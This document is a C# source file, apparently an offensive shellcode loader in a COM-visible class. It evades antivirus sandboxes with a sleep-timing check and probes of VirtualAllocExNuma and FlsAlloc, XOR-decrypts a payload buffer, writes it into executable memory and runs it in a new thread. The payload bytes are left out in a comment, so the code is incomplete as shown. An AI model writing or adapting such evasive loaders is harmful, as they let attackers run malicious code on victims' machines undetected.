using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
  uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    static extern UInt32 FlsAlloc(IntPtr lpCallback);
    public TestClass()
    {                                                                                                                                                      
        //Check if we're running in an AV emulator                                                                                                         
        DateTime t1 = DateTime.Now;                                                                                                                        
        Sleep(10000);
        double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
        if (deltaT < 9.5)
        {
            return;
        }

        //VirtualAllocExNuma is not always emulated.  Check and fail if not present.
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null)
        {
            return;
        }

        //FlsAlloc is another api that is not always emulated
        UInt32 result = FlsAlloc(IntPtr.Zero);
        if (result == 0xFFFFFFFF)
        {
            return;
        }
       //output from Helper
       //byte[] buf = new byte[460] { ... 0x9f };

        int size = buf.Length;

        // XOR-decrypt the shellcode
        for (int i = 0; i < buf.Length; i++)
        {
            buf[i] = (byte)(buf[i] ^ (byte)'J');
        }

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);


    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}

